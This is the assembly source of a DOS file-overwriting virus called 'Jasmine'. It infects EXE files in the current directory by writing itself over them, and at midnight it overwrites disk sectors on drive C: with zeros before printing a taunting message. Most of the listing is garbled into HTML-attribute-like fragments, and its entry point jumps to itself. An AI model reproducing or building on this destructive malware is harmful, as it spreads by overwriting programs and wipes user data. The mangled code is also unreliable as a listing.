

;Jasmine virus - simple EXE overwriting virus
;attempts to infect three files in current 
;directory.  Will do so again and again.
;Occasionally attempts to destroy small
;hard disks

data_buf        equ     9Eh                   

code            segment byte public
		assume  cs:code; ds:code


		org     100h

jasmine         proc    far

start:
		jmp     start
		db      90h            ;<-----nothing searchmask="" db="" 2ah="" db="" 2eh,="" 65h,="" 78h,="" 65h,="" 00h="" ;*.exe="" virus="" searchmask="" start:="" mov="" ah,2ch="" int="" 21h="" ;get="" time,="" cmp="" ch,0="" :="" is="" midnight="" jne="" continue_noharm="" ;="" jump="" if="" not="" equal="" mov="" al,2="" mov="" cx,5="" mov="" dx,0="" int="" 26h="" ;="" disk="" write,="" drive="" c:="" ;="" if="" disk="" under="" 32mb,="" start="" ;="" at="" partition="" sector,="" write="" ;="" 5="" sectors="" with="" "0"="" words="" ;="" continue_noharm:="" mov="" ah,4eh="" ;="" mov="" dx,offset="" searchmask="" ;="" find="" file,="" *.exe="" xor="" cx,cx="" int="" 21h="" mov="" dx,data_buf="" mov="" ah,3dh="" mov="" al,1="" int="" 21h="" ;="" open="" file,="" pointed="" to="" ;="" mov="" bx,ax="" mov="" ah,40h="" mov="" dx,100h="" mov="" cx,10eh="" int="" 21h="" ;="" write="" virus="" to="" file,="" ;="" seek="" from="" beginning="" of="" host="" ;="" write="" 270="" bytes="" beginning="" ;="" from="" virus="" head="" in="" memory="" mov="" ah,3eh="" int="" 21h="" ;="" close="" host="" mov="" al,1="" mov="" cx,1="" mov="" ah,43h="" int="" 21h="" ;="" complete="" nonsense="" ;="" in="" this="" kind="" of="" virus="" mov="" ah,4fh="" int="" 21h="" ;="" everything="" from="" here="" to="" ;="" video="" display="" just="" stupidly="" mov="" dx,data_1e="" ;="" repeats="" the="" above="" routine="" mov="" ah,3dh="" ;="" long="" hand="" mov="" al,1="" int="" 21h="" mov="" bx,ax="" mov="" ah,40h="" mov="" dx,100h="" mov="" cx,10eh="" int="" 21h="" mov="" ah,3eh="" int="" 21h="" mov="" ah,43h="" mov="" al,1="" mov="" cx,1="" int="" 21h="" mov="" ah,4fh="" int="" 21h="" mov="" dx,data_buf="" mov="" ah,3dh="" mov="" al,1="" int="" 21h="" mov="" bx,ax="" mov="" ah,40h="" mov="" dx,100h="" ;="" aaaargghhh,="" matey's="" mov="" cx,10eh="" int="" 21h="" mov="" ah,3eh="" int="" 21h="" mov="" ah,43h="" mov="" al,1="" mov="" cx,1="" int="" 21h="" mov="" ah,9="" mov="" dx,offset="" viru_name="" ;="" the="" jasmine="" virus="" int="" 21h="" ;="" print="" asciiz="" to="" screen="" ;="" pointed="" to="" at="" viru_name="" mov="" ah,4ch="" int="" 21h="" ;="" exit="" viru_name="" db="" 'the="" jasmine="" virus="" is="" loose,="" bett'="" db="" 'er="" protect="" your="" computer.beware!'="" db="" 'there="" now="" it="" works!="" [jd]',="" 0ah,="" 0dh="" db="" '$'="" db="" 'admiral="" bailey="" [yam]'="" db="" 0="" jasmine="" endp="" code="" ends="" end="" start=""></-----nothing>